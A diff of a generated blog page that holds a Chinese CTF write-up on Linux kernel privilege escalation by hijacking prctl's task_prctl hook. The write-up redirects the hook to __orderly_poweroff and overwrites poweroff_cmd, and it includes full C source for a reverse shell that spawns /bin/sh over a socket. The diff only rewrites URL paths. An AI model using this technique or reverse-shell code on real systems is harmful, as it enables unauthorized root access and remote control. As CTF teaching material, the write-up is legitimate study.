@@ -5,40 +5,40 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。 我们分析一下prctl源码，在linux&#x2F;kernel&#x2F;sys.c里，我们看到这">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux kernel pwn学习之hijack prctl">
-<meta property="og:url" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/index.html">
+<meta property="og:url" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。 我们分析一下prctl源码，在linux&#x2F;kernel&#x2F;sys.c里，我们看到这">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image1.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image2.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image3.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image4.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image5.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image6.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image7.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image8.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image9.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image10.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image11.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image12.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image1.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image2.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image3.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image4.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image5.png">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image6.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image7.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image8.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image9.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image10.JPG">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image11.png">
+<meta property="og:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image12.JPG">
 <meta property="article:published_time" content="2020-03-06T06:25:11.000Z">
 <meta property="article:modified_time" content="2025-06-26T04:00:11.003Z">
 <meta property="article:author" content="ha1vk">
@@ -48,9 +48,9 @@
 <meta property="article:tag" content="hijack prctl">
 <meta property="article:tag" content="modprobe_path">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image1.JPG">
+<meta name="twitter:image" content="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/image1.JPG">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/">
+<link rel="canonical" href="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/">
 
 
 <script id="page-configurations">
@@ -112,7 +112,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -133,27 +133,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -211,10 +211,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/03/06/linux_kernel_pwn_hijack_prctl/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -249,7 +249,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -273,41 +273,41 @@
       
         <p>Prctl是linux的一个函数，可以对进程、线程做一些设置，<strong>prctl内部通过虚表来调用对应的功能</strong>，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，<strong>且以root权限执行，由此可以利用起来提权。</strong></p>
 <p>我们分析一下prctl源码，在linux&#x2F;kernel&#x2F;sys.c里，我们看到这</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image1.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image1.JPG" class="">
 
 <p>我们继续跟进，查看security_task_prctl函数，在linux&#x2F;security&#x2F;security.c文件里找到</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image2.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image2.JPG" class="">
 
 <p>函数调用了task_prctl表里的函数，因此，如果我们劫持task_prctl表，就能通过执行prctl来执行我们想要的函数，比如call_usermodehelper函数。为了确定我们该劫持的表的地址，我们先写一个小demo.c</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">   prctl(<span class="number">0</span>,<span class="number">0</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
 
 <p>然后，编译，放到系统里，我们先查看一下security_task_prctl函数的地址</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image3.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image3.JPG" class="">
 
 <p>接下来，我们用gdb在这里断点，然后运行我们的demo程序</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image4.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image4.JPG" class="">
 
 <p>成功断点</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image5.png" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image5.png" class="">
 
 <p>继续单步运行，到这里</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image6.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image6.JPG" class="">
 
 <p>从而，我们确定了task_prctl表的地址，减去内核基地址，我们就能确定task_prctl的偏移了。在这里，我们得到的是偏移是0xeb8118。</p>
 <p>有一点不幸的是, 传入security_task_prctl函数的第一个参数被截断了，这意味着，如果我们<strong>把task_prctl劫持为call_usermodehelper，在64位下不能完成利用。</strong></p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image7.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image7.JPG" class="">
 
 <p>因为call_usermodehelper函数的第一个参数是一个字符串地址</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image8.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image8.JPG" class="">
 
 <p>为了解决这个问题，我们可以借鉴一下glibc下劫持为one_gadget的思想，我们来搜索一下有没有类似的one_gadget可以使用。我们在内核源码里搜索哪些函数调用了call_usermodehelper函数。</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image9.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image9.JPG" class="">
 
 <p>我们发现mce_do_trigger函数可以用，它调用call_usermodehelper函数的前两个参数来自全局数据段，或许可以被我们劫持修改</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image10.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image10.JPG" class="">
 
 <p>我们有找到几个合适的</p>
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image11.png" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image11.png" class="">
 
 <p>其中run_cmd调用了call_usermodehelper函数。由此，**我们只需要把prctl_task劫持到这几个函数，比如__orderly_poweroff，然后篡改poweroff_cmd为我们需要执行的二进制文件路径。接着调用prctl，就会以root权限执行我们的二进制文件，从而提权。**我们可以执行一个反弹shell的程序，然后用nc来连接。</p>
 <p>为了实现上述目标，我们首先需要得到内核基址，之前，我在<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104694219">https://blog.csdn.net/seaaseesa/article/details/104694219</a>这篇博客里讲到了劫持vdso，我们同样需要利用一下，我们计算出了vdso的地址后，就能算出内核的基址，因为它们之间的差值是不变的。</p>
@@ -317,7 +317,7 @@
 <p>而qwb2018-solid_core同样，也是这个解法，稍作一下修改即可。反弹shell的程序如下</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">char</span> server_ip[]=<span class="string">&quot;127.0.0.1&quot;</span>;  </span><br><span class="line"><span class="type">uint32_t</span> server_port=<span class="number">7777</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>   </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;  </span><br><span class="line">    attacker_addr.sin_family = AF_INET;  </span><br><span class="line">    attacker_addr.sin_port = htons(server_port);  </span><br><span class="line">    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);  </span><br><span class="line">    <span class="keyword">while</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>);  </span><br><span class="line">    dup2(sock, <span class="number">0</span>);  </span><br><span class="line">    dup2(sock, <span class="number">1</span>);  </span><br><span class="line">    dup2(sock, <span class="number">2</span>);  </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image12.JPG" class="">
+<img src="/2020/03/06/linux_kernel_pwn_hijack_prctl/image12.JPG" class="">
 
     </div>
 
@@ -327,11 +327,11 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
-              <a href="/ha1vk/tags/Linux-Kernel/" rel="tag"># Linux Kernel</a>
-              <a href="/ha1vk/tags/Linux%E5%86%85%E6%A0%B8%E5%A0%86/" rel="tag"># Linux内核堆</a>
-              <a href="/ha1vk/tags/hijack-prctl/" rel="tag"># hijack prctl</a>
-              <a href="/ha1vk/tags/modprobe-path/" rel="tag"># modprobe_path</a>
+              <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
+              <a href="/tags/Linux-Kernel/" rel="tag"># Linux Kernel</a>
+              <a href="/tags/Linux%E5%86%85%E6%A0%B8%E5%A0%86/" rel="tag"># Linux内核堆</a>
+              <a href="/tags/hijack-prctl/" rel="tag"># hijack prctl</a>
+              <a href="/tags/modprobe-path/" rel="tag"># modprobe_path</a>
           </div>
 
         
@@ -340,11 +340,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/03/06/linux_kernel_pwn_vdso/" rel="prev" title="linux kernel pwn学习之劫持vdso">
+    <a href="/2020/03/06/linux_kernel_pwn_vdso/" rel="prev" title="linux kernel pwn学习之劫持vdso">
       <i class="fa fa-chevron-left"></i> linux kernel pwn学习之劫持vdso
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/" rel="next" title="mips/arm pwn初探">
+    <a href="/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/" rel="next" title="mips/arm pwn初探">
       mips/arm pwn初探 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -416,20 +416,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -502,30 +502,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
